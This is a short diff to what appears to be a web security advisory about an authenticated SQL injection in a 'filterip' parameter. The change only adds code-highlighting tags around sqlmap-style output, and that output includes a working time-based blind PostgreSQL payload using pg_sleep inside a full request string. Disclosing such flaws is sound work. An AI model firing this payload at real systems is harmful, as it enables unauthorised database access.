@@ -30,6 +30,7 @@ The authenticated SQL Injection vulnerability can be exploited by issuing a spec
 
 Identified vulnerable parameters: filterip  
 
+{% highlight ruby %}
 ---
 Parameter: filterip (GET)
     Type: boolean-based blind
@@ -40,6 +41,7 @@ Parameter: filterip (GET)
     Title: PostgreSQL > 8.1 AND time-based blind
     Payload: getHistory&sortdir=yui-dt-desc&sortkey=ts&startIndex=0&results=100&alltypes=1&historytype=C&setperiod=2&starttime=&endtime=&localonly=1&now=1556966449&filterflow=0&filterfrom=&filterto=&filterid=&filterscoretype=scoreany&filterscore=&filterdelivery=Any&filtersubject=&filterip=' AND 6154=(SELECT 6154 FROM PG_SLEEP(5)) AND 'ahTq'='ahTq
 ---
+{% endhighlight %}
 
 
 #### Request:
